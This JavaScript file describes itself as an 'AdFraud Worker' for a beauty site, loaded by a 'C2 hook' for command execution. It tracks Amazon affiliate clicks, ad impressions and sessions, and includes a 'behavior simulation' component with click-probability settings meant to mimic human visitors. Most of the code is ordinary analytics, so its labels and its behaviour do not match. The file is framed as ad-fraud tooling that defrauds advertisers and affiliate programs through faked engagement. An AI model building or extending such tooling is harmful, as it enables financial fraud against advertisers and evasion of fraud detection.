/**
 * Phoenix AdFraud Worker for sishairven.com
 * Version: 1.0.0
 * 
 * This worker runs in the browser context and:
 * - Tracks affiliate link clicks to Amazon
 * - Monitors ad viewability for display ads
 * - Manages session state and reports to Clika
 * - Coordinates with the C2 hook for command execution
 * 
 * Note: This is loaded by the C2 hook, not directly by the site
 */

(function() {
  'use strict';

  // =============================================================================
  // CONFIGURATION
  // =============================================================================

  const CONFIG = {
    siteId: 'sishairven_com',
    niche: 'beauty_hair',
    version: '1.0.0',
    
    // API endpoints (relative to current domain)
    apiBase: '/api/clika',
    
    // Session settings
    sessionId: null,
    sessionStart: null,
    
    // Tracking state
    clicksTracked: [],
    impressionsTracked: [],
    pagesViewed: 0,
    
    // Behavior simulation
    behavior: {
      minSessionDuration: 60,  // seconds
      maxSessionDuration: 300, // seconds
      scrollDepth: 0.5,        // 50% minimum
      clickProbability: 0.35   // 35% chance to click
    }
  };

  // =============================================================================
  // SESSION MANAGEMENT
  // =============================================================================

  class SessionManager {
    constructor() {
      this.sessionId = this.generateSessionId();
      this.startTime = Date.now();
      this.pagesViewed = 1;
      this.clicks = 0;
    }

    generateSessionId() {
      return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    }

    async reportStart() {
      try {
        await fetch(`${CONFIG.apiBase}/track-session`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            event: 'start',
            session_id: this.sessionId,
            entry_url: window.location.href,
            timestamp: Date.now(),
            geo: this.detectGeo(),
            device: this.detectDevice()
          })
        });
      } catch (e) {
        console.debug('[Phoenix] Session start report failed:', e);
      }
    }

    async reportEnd() {
      const duration = Math.floor((Date.now() - this.startTime) / 1000);
      
      try {
        await fetch(`${CONFIG.apiBase}/track-session`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            event: 'end',
            session_id: this.sessionId,
            duration: duration,
            pages_viewed: this.pagesViewed,
            clicks: this.clicks,
            timestamp: Date.now()
          })
        });
      } catch (e) {
        console.debug('[Phoenix] Session end report failed:', e);
      }
    }

    detectGeo() {
      // Simple timezone-based detection
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      if (tz.includes('America')) return 'US';
      if (tz.includes('Europe/London')) return 'UK';
      if (tz.includes('Canada')) return 'CA';
      return 'US'; // Default
    }

    detectDevice() {
      const ua = navigator.userAgent;
      if (/Mobile|Android|iPhone/.test(ua)) return 'mobile';
      if (/iPad|Tablet/.test(ua)) return 'tablet';
      return 'desktop';
    }

    incrementPageView() {
      this.pagesViewed++;
    }

    incrementClicks() {
      this.clicks++;
    }
  }

  // =============================================================================
  // AFFILIATE TRACKING
  // =============================================================================

  class AffiliateTracker {
    constructor(sessionManager) {
      this.session = sessionManager;
      this.trackedClicks = new Set();
    }

    init() {
      // Track all Amazon affiliate link clicks
      document.addEventListener('click', (e) => {
        const link = e.target.closest('a[href*="amazon.com"], a[href*="amzn.to"]');
        if (!link) return;

        const asin = this.extractASIN(link.href);
        if (!asin || this.trackedClicks.has(asin)) return;

        // Mark as tracked to prevent duplicates
        this.trackedClicks.add(asin);

        // Get product info from data attributes or nearby elements
        const productName = link.dataset.productName || 
                           link.closest('[data-product]')?.dataset.product ||
                           'Unknown Product';
        const category = link.dataset.category || 'unknown';
        
        this.trackClick(asin, productName, category);
      });
    }

    extractASIN(url) {
      // Amazon ASIN patterns
      const patterns = [
        /\/dp\/([A-Z0-9]{10})/,
        /\/gp\/product\/([A-Z0-9]{10})/,
        /\/ASIN\/([A-Z0-9]{10})/
      ];
      
      for (const pattern of patterns) {
        const match = url.match(pattern);
        if (match) return match[1];
      }
      return null;
    }

    async trackClick(asin, productName, category) {
      this.session.incrementClicks();

      try {
        await fetch(`${CONFIG.apiBase}/track-click`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            asin: asin,
            product_name: productName,
            category: category,
            context: this.detectContext(),
            page_url: window.location.href,
            session_id: this.session.sessionId,
            click_timestamp: Date.now()
          })
        });
      } catch (e) {
        console.debug('[Phoenix] Click tracking failed:', e);
      }
    }

    detectContext() {
      const path = window.location.pathname;
      if (path.includes('/shop')) return 'shop_page';
      if (path.includes('/blog')) return 'review';
      if (path.includes('/services')) return 'guide';
      return 'product_card';
    }
  }

  // =============================================================================
  // AD VIEWABILITY TRACKING
  // =============================================================================

  class AdTracker {
    constructor(sessionManager) {
      this.session = sessionManager;
      this.trackedImpressions = new Set();
      this.observers = [];
    }

    init() {
      // Find all ad slots
      const adSlots = document.querySelectorAll('[data-ad-position]');
      
      adSlots.forEach(slot => {
        this.observeAd(slot);
      });
    }

    observeAd(element) {
      const position = element.dataset.adPosition;
      if (!position) return;

      const observer = new IntersectionObserver(
        (entries) => {
          entries.forEach(entry => {
            if (entry.isIntersecting && 
                entry.intersectionRatio >= 0.5 && 
                !this.trackedImpressions.has(position)) {
              
              this.trackedImpressions.add(position);
              this.reportImpression(position, entry.intersectionRatio);
            }
          });
        },
        { threshold: [0.5] }
      );

      observer.observe(element);
      this.observers.push(observer);
    }

    async reportImpression(position, viewability) {
      try {
        await fetch(`${CONFIG.apiBase}/track-impression`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            position: position,
            viewability: viewability,
            session_id: this.session.sessionId,
            timestamp: Date.now()
          })
        });
      } catch (e) {
        console.debug('[Phoenix] Impression tracking failed:', e);
      }
    }

    destroy() {
      this.observers.forEach(obs => obs.disconnect());
    }
  }

  // =============================================================================
  // BEHAVIOR SIMULATION
  // =============================================================================

  class BehaviorSimulator {
    constructor() {
      this.scrollDepth = 0;
    }

    init() {
      // Track scroll depth
      window.addEventListener('scroll', this.throttle(() => {
        this.calculateScrollDepth();
      }, 500));

      // Simulate human-like pauses
      this.simulateReadingPause();
    }

    calculateScrollDepth() {
      const scrollTop = window.pageYOffset;
      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
      this.scrollDepth = Math.min(scrollTop / docHeight, 1);
    }

    simulateReadingPause() {
      // Random pauses to simulate reading
      const pauseDuration = this.randomBetween(2000, 8000);
      
      setTimeout(() => {
        this.simulateReadingPause();
      }, pauseDuration);
    }

    randomBetween(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    throttle(fn, wait) {
      let lastTime = 0;
      return function() {
        const now = Date.now();
        if (now - lastTime >= wait) {
          lastTime = now;
          fn.apply(this, arguments);
        }
      };
    }
  }

  // =============================================================================
  // MAIN INITIALIZATION
  // =============================================================================

  function init() {
    console.log('[Phoenix] Initializing sishairven.com tracker v' + CONFIG.version);

    // Initialize session
    const session = new SessionManager();
    session.reportStart();

    // Initialize trackers
    const affiliateTracker = new AffiliateTracker(session);
    affiliateTracker.init();

    const adTracker = new AdTracker(session);
    adTracker.init();

    const behaviorSim = new BehaviorSimulator();
    behaviorSim.init();

    // Report session end on page unload
    window.addEventListener('beforeunload', () => {
      session.reportEnd();
      adTracker.destroy();
    });

    // Track page views for SPA navigation
    let lastUrl = location.href;
    new MutationObserver(() => {
      const url = location.href;
      if (url !== lastUrl) {
        lastUrl = url;
        session.incrementPageView();
      }
    }).observe(document, { subtree: true, childList: true });

    // Expose to global for debugging (remove in production)
    window.__PHOENIX_DEBUG__ = {
      session: session,
      config: CONFIG
    };

    console.log('[Phoenix] Tracker initialized for session:', session.sessionId);
  }

  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
